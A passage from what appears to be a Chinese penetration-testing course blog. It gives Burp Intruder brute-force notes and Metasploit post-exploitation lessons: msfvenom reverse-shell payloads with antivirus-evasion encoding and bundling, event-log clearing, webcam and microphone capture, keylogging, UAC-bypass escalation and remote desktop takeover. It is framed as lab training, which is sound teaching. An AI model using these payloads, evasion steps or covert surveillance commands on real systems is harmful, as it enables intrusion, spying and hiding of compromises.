title="Repeater模块作用"></a>Repeater模块作用</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ol><li>发起HTTP请求，分析响应 </li><li>重放请求</li></ol><h2 id="Repeater使用方法"><a href="#Repeater使用方法" class="headerlink" title="Repeater使用方法"></a>Repeater使用方法</h2><h3 id="内容来源"><a href="#内容来源" class="headerlink" title="内容来源"></a>内容来源</h3><ol><li>从其他模块发送（Ctrl +R ） </li><li>手动填入</li></ol><h1 id="Burp-Intrude"><a href="#Burp-Intrude" class="headerlink" title="Burp Intrude"></a>Burp Intrude</h1><h2 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://portswigger.net/burp/documentation/desktop/tools/intruder">https://portswigger.net/burp/documentation/desktop/tools/intruder</a></p><h2 id="Intruder模块作用与原理"><a href="#Intruder模块作用与原理" class="headerlink" title="Intruder模块作用与原理"></a>Intruder模块作用与原理</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="http://xxx.wuya.com/bbs/index.php?name=wuyanzu&amp;motto=go">http://xxx.wuya.com/bbs/index.php?name=wuyanzu&amp;motto=go</a> </p><p>对请求参数进行修改，分析响应内容，获得特征数据 </p><p>本质： </p><ol><li>自动化发起HTTP请求 </li><li>基于现成字典或者生成字典</li></ol><h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><ol><li>猜测用户名、密码等 </li><li>寻找参数、目录等 </li><li>枚举商品ID、验证码等</li><li>模糊测试（FUZZ）</li><li>…….</li></ol><p>可替代工具： </p><p>wfuzz（全部功能）、dirb（目录扫描）、hydra（暴 破）……</p><h2 id="Intruder实现暴力破解"><a href="#Intruder实现暴力破解" class="headerlink" title="Intruder实现暴力破解"></a>Intruder实现暴力破解</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>从其他模块发送或者手动填写 </li><li>选择攻击模式 Attack type </li><li>选择攻击字段 Positions </li><li>设置payload </li><li>其他设置（线程池等） </li><li>发起攻击 </li><li>查看结果</li></ol><h3 id="攻击模式"><a href="#攻击模式" class="headerlink" title="攻击模式"></a>攻击模式</h3><ul><li>Sniper 狙击手 </li><li>Battering ram 攻城锤 </li><li>Pitchfork 草叉 </li><li>Cluster bomb 榴霰[xiàn]弹</li></ul><h3 id="payload-type"><a href="#payload-type" class="headerlink" title="payload type"></a>payload type</h3><table><thead><tr><th>类别</th><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Simple list</td><td>简单字典</td><td>添加、粘贴或者从文件读取字典，或者使用预定义的字典</td></tr><tr><td>Runtime file</td><td>运行时文件</td><td>运行时，Burp Intruder将读取文件的每一行作为一个 Payload</td></tr><tr><td>Custom iterator</td><td>自定义迭代器</td><td>这个是占位填充的一种方式，最多8位</td></tr><tr><td>Character substitution</td><td>字符替换</td><td>把字典里面相应的字符进行替换</td></tr><tr><td>Case modification</td><td>大小写修改</td><td>要不要保持原样的，要不要全部大写的，要不要全小写的， 要不要驼峰命名的</td></tr><tr><td>Recrusvive grep</td><td>递归查找</td><td>用来提取相应数据的比如拿到PHPSESSIONID，拿到TOKEN 等等，可以通过格式匹配抓取到对应的字段值。</td></tr><tr><td>Illegal unicode</td><td>非法Unicode 编码</td><td>用于绕过正则表达式的过滤验证</td></tr><tr><td>Character blocks</td><td>字符块</td><td>比如生成100A，200个+号，300个数字1等等</td></tr><tr><td>numbers</td><td>数字组合</td><td></td></tr><tr><td>dates</td><td>日期组合</td><td></td></tr><tr><td>Brute forcer</td><td>暴力破解</td><td>暴力枚举，最后一位先固定，然后一个个改</td></tr><tr><td>Null payloads</td><td>空payload</td><td>不需要设置payload</td></tr><tr><td>Character frobber</td><td>字符frobber</td><td>依次修改指定字符串在每个字符位置的值，每次都是在原字 符上递增一个该字符的ASCII码。</td></tr><tr><td>Bit flipper</td><td>Bit翻转</td><td>对预设的Payload原始值，按照比特位，依次进行修改</td></tr><tr><td>Username generator</td><td>用户名生成器</td><td>主要用于用户名和email帐号的自动生成</td></tr><tr><td>ECB block shuffler</td><td>ECB加密块洗牌</td><td>基于ECB加密模式的Payload生成器</td></tr><tr><td>Extension-generated</td><td>Burp Payload 生成插件</td><td>基于Burp插件来生成Payload值，需要安装插件</td></tr><tr><td>Copy other payload</td><td>Payload复制</td><td>是将其他位置的参数复制到Payload位置上（比如密码要输 入两遍）</td></tr></tbody></table><p><a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types">https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types</a></p><h2 id="Intruder其他攻击模式"><a href="#Intruder其他攻击模式" class="headerlink" title="Intruder其他攻击模式"></a>Intruder其他攻击模式</h2><h3 id="Battering-ram-攻城锤"><a href="#Battering-ram-攻城锤" class="headerlink" title="Battering ram 攻城锤"></a>Battering ram 攻城锤</h3><p>所有字段的值相同，来自同一个字典</p><h3 id="Pitchfork-草叉"><a href="#Pitchfork-草叉" class="headerlink" title="Pitchfork 草叉"></a>Pitchfork 草叉</h3><p>从多个字典提取值，赋给多个字段，按顺序一一对应 </p><p>例如： </p><ul><li>100个用户名 </li><li>50个密码 </li><li>最终请求次数：50次</li></ul><h3 id="Cluster-bomb-榴霰弹"><a href="#Cluster-bomb-榴霰弹" class="headerlink" title="Cluster bomb 榴霰弹"></a>Cluster bomb 榴霰弹</h3><p>所有字典全部交叉验证 </p><p>例如： </p><ul><li>100个用户名 </li><li>50个密码 </li><li>最终请求次数：5000次</li></ul><h2 id="Intruder标记结果"><a href="#Intruder标记结果" class="headerlink" title="Intruder标记结果"></a>Intruder标记结果</h2><h3 id="Grep-Match"><a href="#Grep-Match" class="headerlink" title="Grep Match"></a>Grep Match</h3><p><img src="/assets/image-20221220091129176.png" alt="image-20221220091129176"></p><h2 id="Intruder获得CSRF-Token"><a href="#Intruder获得CSRF-Token" class="headerlink" title="Intruder获得CSRF Token"></a>Intruder获得CSRF Token</h2><h3 id="Grep-Extract"><a href="#Grep-Extract" class="headerlink" title="Grep Extract"></a>Grep Extract</h3><p><img src="/assets/image-20221220091307639.png" alt="image-20221220091307639"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/30.3-msf-qing-li-shi-jian-ri-zhi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/30.3-msf-qing-li-shi-jian-ri-zhi/</url>
      
        <content type="html"><![CDATA[<p>再进入肉鸡执行一些操作时，windows 下记录的操作日志可在日志查看器中进行查看，可以通过运行 eventvwr 命令打开。包括了应用程序、系统、安全等模块的日志，为了不让其查到自己或知道自己的操作，则可以使用 meterpreter 的 <code>clearev</code> 命令来清除其日志。未清除日志前可查看系统记录的一些处理信息。</p><p>![1645511582659](03 msf清理事件日志.assets/1645511582659.png)</p><p>然后在 meterpreter 下执行 clearev 命令，可以看到清除提示，分别清除了应用程序，系统和安全模块的日志记录。</p><p><code>clearev</code>      清理日志</p><p>![1645511593151](03 msf清理事件日志.assets/1645511593151.png)</p><p>（注意 使用clearev命令时 需要获得靶机的 <strong>system  权限</strong>）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/30.2-msf-bian-ma-mian-sha/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/30.2-msf-bian-ma-mian-sha/</url>
      
        <content type="html"><![CDATA[<ol><li><p>杀软是如何检测出恶意代码的？</p><p>​特征码、启发式恶意软件检查和行为。</p></li><li><p>免杀是做什么？</p><p>​对特征进行混淆，打乱代码，避免杀毒软件查杀</p></li><li><p>免杀的基本方法有哪些？</p><p>​自编码处理  自捆绑+编码  多重编码   接口下载式  签名伪装式</p></li></ol><p>针对杀毒软件的基本检测方法，我们可有以下几种方法实现免杀：</p><p>改变特征码<br>改变行为<br>其它</p><p>由于msf被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果</p><p>要用到的在线查毒工具virscan提供</p><p><a href="https://www.virscan.org/">https://www.virscan.org/</a></p><h1 id="一、不处理payload直接生成样本进行检测"><a href="#一、不处理payload直接生成样本进行检测" class="headerlink" title="一、不处理payload直接生成样本进行检测"></a>一、不处理payload直接生成样本进行检测</h1><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -f exe -o payload1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1645511560404](02 msf编码免杀.assets/1645511560404.png)</p><p>进行查毒有41%的杀毒软件报毒了</p><p>具体查毒结果链接：</p><p><a href="https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9">https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9</a></p><p>![1645511550808](02 msf编码免杀.assets/1645511550808.png)</p><h1 id="二、-MSF自编码处理payload生成样本进行检测"><a href="#二、-MSF自编码处理payload生成样本进行检测" class="headerlink" title="二、 MSF自编码处理payload生成样本进行检测"></a>二、 MSF自编码处理payload生成样本进行检测</h1><p>首先我们输入   <code>msfvenom --list encoders</code>   查看可以用编码模块</p><p>![1645511543145](02 msf编码免杀.assets/1645511543145.png)</p><p>我们使用  <code>x86/shikata_ga_nai</code> 模块 免杀中使用频率最高的一个编码器</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai HOST=192.168.70.3  LPORT=4456 -f exe -o payload1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行查毒有37%的杀毒软件报毒了</p><p>![1645511533351](02 msf编码免杀.assets/1645511533351.png)</p><h1 id="三、MSF自捆绑处理payload生成样本进行检测"><a href="#三、MSF自捆绑处理payload生成样本进行检测" class="headerlink" title="三、MSF自捆绑处理payload生成样本进行检测"></a>三、MSF自捆绑处理payload生成样本进行检测</h1><p>使用msfvenom的**-x参数可以指定一个可执行文件**,将payload与其捆绑</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -x UltraISO.exe -f exe -o payload2.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1645511525813](02 msf编码免杀.assets/1645511525813.png)</p><p>进行查毒有37%的杀毒软件报毒了</p><p>![1645511516751](02 msf编码免杀.assets/1645511516751.png)</p><h1 id="四、MSF自捆绑-编码处理payload生成样本进行检测"><a href="#四、MSF自捆绑-编码处理payload生成样本进行检测" class="headerlink" title="四、MSF自捆绑+编码处理payload生成样本进行检测"></a>四、MSF自捆绑+编码处理payload生成样本进行检测</h1><p>结合第二种，第三种。编码方式我们再次生成样本</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 10 -f exe -o payload3.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1645511507586](02 msf编码免杀.assets/1645511507586.png)</p><p>进行查毒有31%的杀毒软件报毒了</p><p>![1645511497457](02 msf编码免杀.assets/1645511497457.png)</p><p>那我们<strong>继续增加编码次数</strong></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 20 -f exe -o payload4.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行查毒有27%的杀毒软件报毒了!</p><p>![1645511487704](02 msf编码免杀.assets/1645511487704.png)</p><h1 id="五、MSF多重编码payload生成样本进行检测"><a href="#五、MSF多重编码payload生成样本进行检测" class="headerlink" title="五、MSF多重编码payload生成样本进行检测"></a>五、MSF多重编码payload生成样本进行检测</h1><p>通过管道，让msfvenom用不同编码器反复编码进行混淆。使用管道让msfvenom对攻击载荷多重编码，<strong>先用shikata_ga_nai编码10次，接着来10次的alpha_upper编码，再来10次的countdown编码</strong>，最后才生成<strong>以UltraISO.exe为模板</strong>的可执行文件payload5.exe。</p><pre class="line-numbers language-none"><code class="language-none">msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=192.168.70.3 LPORT=4456 -f raw | msfvenom -p windows/meterpreter/reverse_tcp -e x86/alpha_upper -i 10 -f raw | msfvenom -p windows/meterpreter/reverse_tcp -e x86/countdown -i 10 -x UltraISO.exe -f exe -o payload5.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="六、-生成Shellcode使用C语言调用"><a href="#六、-生成Shellcode使用C语言调用" class="headerlink" title="六、 生成Shellcode使用C语言调用"></a>六、 生成Shellcode使用C语言调用</h1><p>1、直接在linux中利用msf的meterpreter生成的文件以.c形式文件存储，得到机器码。命令：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4456 -f c &gt;c0001.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1645511458128](02 msf编码免杀.assets/1645511458128.png)</p><p>2、改c文件，并编译，并加壳</p><p>![1645511469800](02 msf编码免杀.assets/1645511469800.png)</p><p>随便写一个hello world</p><pre class="line-numbers language-none"><code class="language-none">main() {printf("hello world\n");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后编译 并加壳</p><p><strong>vmp</strong>加壳工具</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/29-hou-shen-tou-zhi-diao-yong-she-xiang-tou/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/29-hou-shen-tou-zhi-diao-yong-she-xiang-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><p>1 MSF-Metasploit Framework</p><p>2 一台windiows靶机</p><p>3 一台<strong>安卓</strong>设备，没有可以使用模拟器</p><h1 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h1><p>靶机获取到meterpreter后我们可以使用  webcam模块实现调用软，硬件摄像头</p><p>webcam模块支持命令</p><table><thead><tr><th>id</th><th>模块名</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td><strong>webcam_list</strong></td><td><strong>列出</strong>靶机中的所有软，硬件摄像头列表，并编号</td></tr><tr><td>2</td><td><strong>webcam_snap</strong></td><td>可调用单个软，硬件摄像头<strong>拍照</strong>，默认调用第一个摄像头</td></tr><tr><td>3</td><td><strong>webcam_stream</strong></td><td>可调用单个软，硬件摄像头<strong>直播</strong>，默认调用第一个摄像头</td></tr></tbody></table><p>1  webcam_list</p><p><img src="/%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494100592.png" alt="1644494100592"></p><p>2 <code>webcam_snap</code>  调用单个软，硬件摄像头拍照</p><table><thead><tr><th>id</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>-h</code></td><td>显示帮助</td></tr><tr><td>2</td><td><code>-i</code></td><td>-i 1 “1”代表调用摄像头编号</td></tr><tr><td>3</td><td><code>-p</code></td><td>-p  /root “root”设置存储路径</td></tr><tr><td>4</td><td><code>-q</code></td><td>-q  100  “100” 表示存储图片的质量默认为 50</td></tr><tr><td>5</td><td><code>-v</code></td><td>-v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true</td></tr></tbody></table><p><img src="/%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494089950.png" alt="1644494089950"></p><p>3 <code>webcam_stream</code>  调用单个软，硬件摄像头直播</p><table><thead><tr><th>id</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>-h</code></td><td>显示帮助</td></tr><tr><td>2</td><td><code>-d</code></td><td>-d 100  “100”=100秒   设置流持续时间为100秒   默认为1800</td></tr><tr><td>3</td><td><code>-i</code></td><td>-i 1 “1”代表调用摄像头编号</td></tr><tr><td>4</td><td><code>-q</code></td><td>-q 100  “100”指流质量 默认为50</td></tr><tr><td>5</td><td><code>-s</code></td><td>-s live “live”指流文件路径  默认输出在当前目录（注意目录不存在不会自动创建）</td></tr><tr><td>7</td><td><code>-f</code></td><td>-f live  “live”指播放文件的存储地址  默认输出在当前目录</td></tr><tr><td>8</td><td><code>-v</code></td><td>-v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/28-hou-shen-tou-yuan-cheng-kong-zhi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/28-hou-shen-tou-yuan-cheng-kong-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><h4 id="1-rdesktop"><a href="#1-rdesktop" class="headerlink" title="1 rdesktop"></a>1 rdesktop</h4><p>在线安装  rdesktop</p><hr><p>Debian,Ubuntu,kali下使用以下命令</p><p> <code>apt-get install rdesktop</code></p><hr><p>Centos/RedHat可以通过yum命令</p><p><code>yum -y install rdesktop</code></p><h4 id="2-一台windiows靶机（没有物理电脑可以使用虚拟机代替）"><a href="#2-一台windiows靶机（没有物理电脑可以使用虚拟机代替）" class="headerlink" title="2 一台windiows靶机（没有物理电脑可以使用虚拟机代替）"></a>2 一台windiows靶机（没有物理电脑可以使用虚拟机代替）</h4><h4 id="MSF-Metasploit-Framework"><a href="#MSF-Metasploit-Framework" class="headerlink" title="MSF-Metasploit Framework"></a>MSF-Metasploit Framework</h4><h1 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h1><p>1 使用rdesktop远程控制</p><p>说明：rdesktop是linux下支持Windows远程桌面连接的客户端程序，在linux系统下可通过它远程访问Windows桌面，支持多种版本。rdesktop是sourceforge下支持GPL协议的一个开源项目，采用RDP（Remote Desktop Protocol,远程桌面协议），几乎可以连接windows的所有版本</p><p>rdesktop常用参数</p><table><thead><tr><th>id</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td><code>-u</code></td><td>账户名</td></tr><tr><td>2</td><td><code>-p</code></td><td>密码</td></tr><tr><td>3</td><td><code>-a 16</code></td><td>指使用16位色显示远程画面</td></tr><tr><td>4</td><td><code>-f</code></td><td>全屏模式（用<strong>Ctrl+Alt+Enter</strong> 组合键退出全屏）</td></tr><tr><td>5</td><td><code>-g</code></td><td>设置分辨率 如 :   -g 1024x768</td></tr><tr><td>6</td><td><code>rdesktop -h</code></td><td>查看rdesktop使用帮助</td></tr></tbody></table><p>rdesktop -u 用户名 -p  密码  -f   IP</p><p><code>rdesktop -u mb -p 123456 -f 192.168.70.14</code></p><p>如果<strong>远程计算机</strong>没有启动远程功能我们可以在meterpreter中输入</p><p><strong>启动远程桌面协议</strong>：<code>run post/windows/manage/enable_rdp</code></p><hr><p>2 通过vnc远程 </p><p><code>run vnc</code></p><p>![1644493726723](27 后渗透远程控制.assets/1644493726723.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/26-hou-shen-tou-zhi-ti-quan-windows/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/26-hou-shen-tou-zhi-ti-quan-windows/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><p>1 MSF-Metasploit Framework</p><p>2 一台windiows靶机</p><h1 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h1><p>1 提权方法（Windows）查看当前获得用户的权限   meterpreter 中输入： getuid</p><p><img src="/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493116225.png" alt="1644493116225"></p><p>方法一、 meterpreter中输入：<code>getsystem</code></p><p><img src="/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493125642.png" alt="1644493125642"></p><p>方法二、使用msf模块提权</p><p>要想提权必须是已经拿到meterpreter  然后将当前meterpreter 后台 meterprerer中输入  <code>background</code></p><p>1、 查看可用模块  MSF终端中输入   <code>search bypassuac</code>   查看提权模块</p><p>2、 选择一个适合当前系统的提权模块  我这边使用的是win10系统</p><p>那我们使用：</p><p><code>use  exploit/windows/local/bypassuac_windows_store_reg</code> </p><p> 尝试提权</p><p>这个模块不行就换一个 </p><p><code>use exploit/windows/local/bypassuac_sluihijack</code></p><p>或者  </p><p><code>use exploit/windows/local/bypassuac_dotnet_profiler</code></p><p>3 配置模块使用参数   终端内输入： <code>show options</code></p><p>4 可以看到需要配置 session  终端内输入：</p><p><code>set session 1</code></p><p>5 执行提权  终端内输入：<code>run</code></p><p>6 获取到meterpreter后 我们在终端内 输入getuid 看实际还没有提权成功  需要在还终端内在输入 <code>getsystem</code> 获取权限 </p><p>7 获取权限完成后 输入<code>getuid</code> 即可看到  已经获取到SYSTEM 最高权限了</p><p><img src="/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493163472.png" alt="1644493163472"></p><p>看到这个证明已经将权限提升成功</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/25-hou-shen-tou-zhi-diao-yong-yin-pin-she-bei-lu-yin/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/25-hou-shen-tou-zhi-diao-yong-yin-pin-she-bei-lu-yin/</url>
      
        <content type="html"><![CDATA[<p>一、环境准备<br>MSF-Metasploit Framework<br>一台安装手机或者模拟器<br>二、实践</p><p><code>record_mic</code>  包含4个可选参数 分别为</p><p><code>-d</code>  是设置录音时长的</p><p><code>-f</code> 设置未见路径的</p><p><code>-h</code>  查看帮助的</p><p><code>-p</code>  控制自动播放的</p><p>一条简单的录音语句</p><p><code>record_mic -d  10 -p true</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/24-hou-shen-tou-zhi-chuang-jian-zhang-hu-windows/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/24-hou-shen-tou-zhi-chuang-jian-zhang-hu-windows/</url>
      
        <content type="html"><![CDATA[<p>一、环境准备</p><p>1 MSF-Metasploit Framework</p><p>2 一台获取到meterpreter的靶机</p><p>二、实际操作</p><p>1、先看下目标靶机已存在用户  meterpreter中输入：</p><p><code>run post/windows/gather/enum_logged_on_users</code></p><p>![1643108073546](22 后渗透之创建账户（Windows）.assets/1643108073546.png) </p><p>2、使用getgui创建 一个用户名为 msb  密码为 123456  的账户</p><p><code>run getgui -u msb -p 123456</code></p><p>run getgui -u {用户名}-p {密码}</p><p>进入win的运行输入<code>netplwiz</code> 可以查看账户创建情况</p><p>![1643108092979](22 后渗透之创建账户（Windows）.assets/1643108092979.png)</p><p>[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到system）</p><p>2.1 绕过UAC提权</p><p><code>use exploit/windows/local/ask</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/21-23-hou-shen-tou-zhi-shang-chuan-xia-zai-wen-jian-ping-mu-jie-tu-jian-pan-ji-lu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/21-23-hou-shen-tou-zhi-shang-chuan-xia-zai-wen-jian-ping-mu-jie-tu-jian-pan-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>第21课 ：后渗透之<strong>上传下载文件</strong></p><table><thead><tr><th align="center">ID</th><th>Command</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">1</td><td><code>upload</code></td><td align="center">传文件到靶机</td></tr><tr><td align="center">2</td><td><code>download</code></td><td align="center">从靶机下载文件</td></tr></tbody></table><p>第22课：后渗透之屏幕截图</p><table><thead><tr><th>ID</th><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>1</td><td><code>screenshot</code></td><td>截图（Windows）</td></tr></tbody></table><p>第23课：后渗透之键盘记录</p><table><thead><tr><th>ID</th><th>Conmmand</th><th>Description</th></tr></thead><tbody><tr><td>1</td><td><code>keyscan_start</code></td><td>启动键盘记录(Windows)</td></tr><tr><td>2</td><td><code>keyscan_dump</code></td><td>导出键盘(Windows)</td></tr><tr><td>3</td><td><code>keyscan_stop</code></td><td>停止键盘记录(Windows)</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/20-hou-shen-tou-zhi-fang-wen-wen-jian-xi-tong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/20-hou-shen-tou-zhi-fang-wen-wen-jian-xi-tong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、后渗透之访问文件系统"><a href="#一、后渗透之访问文件系统" class="headerlink" title="一、后渗透之访问文件系统"></a>一、后渗透之访问文件系统</h1><p>1.文件交互指令</p><table><thead><tr><th align="center">ID</th><th align="left">Command</th><th align="left">Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="left"><code>cat</code></td><td align="left">读取文件内容</td></tr><tr><td align="center">2</td><td align="left"><code>cd</code></td><td align="left">切换靶机目录</td></tr><tr><td align="center">3</td><td align="left"><code>cp</code></td><td align="left">复制文件到目标</td></tr><tr><td align="center">4</td><td align="left"><code>mv</code></td><td align="left">移动到目标</td></tr><tr><td align="center">5</td><td align="left"><code>chmod</code></td><td align="left">修改文件权限（比如chmod 777 shell.elf）</td></tr><tr><td align="center">6</td><td align="left"><code>del / rm</code></td><td align="left">删除靶机文件</td></tr><tr><td align="center">7</td><td align="left"><code>dir</code></td><td align="left">打印靶机目录</td></tr><tr><td align="center">8</td><td align="left"><code>mkdir</code></td><td align="left">在靶机上创建目录</td></tr><tr><td align="center">9</td><td align="left"><code>rmdir</code></td><td align="left">删除靶机目录</td></tr><tr><td align="center">10</td><td align="left"><code>edit</code></td><td align="left">编辑文件</td></tr><tr><td align="center">11</td><td align="left"><strong><code>getlwd</code></strong></td><td align="left">打印<strong>本地</strong>目录</td></tr><tr><td align="center">12</td><td align="left"><code>getwd</code></td><td align="left">打印靶机目录</td></tr><tr><td align="center">13</td><td align="left"><strong><code>lcd</code></strong></td><td align="left">更改<strong>本地</strong>目录</td></tr><tr><td align="center">14</td><td align="left"><strong><code>lls</code></strong></td><td align="left">列出<strong>本地</strong>目录</td></tr><tr><td align="center">15</td><td align="left"><code>ls</code></td><td align="left">列出靶机文件目录</td></tr><tr><td align="center">16</td><td align="left"><strong><code>lpwd</code></strong></td><td align="left">打印<strong>本地</strong>目录</td></tr><tr><td align="center">17</td><td align="left"><code>pwd</code></td><td align="left">打印工作目录</td></tr><tr><td align="center">19</td><td align="left"><code>search</code></td><td align="left">搜索文件 详情search -h</td></tr></tbody></table><p>Linux权限理解</p><pre class="line-numbers language-none"><code class="language-none">chmod  777   {文件名.后缀}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>chmod  777 shell.elf</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/19-tong-guo-mu-ma-fan-dan-shell-android/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/19-tong-guo-mu-ma-fan-dan-shell-android/</url>
      
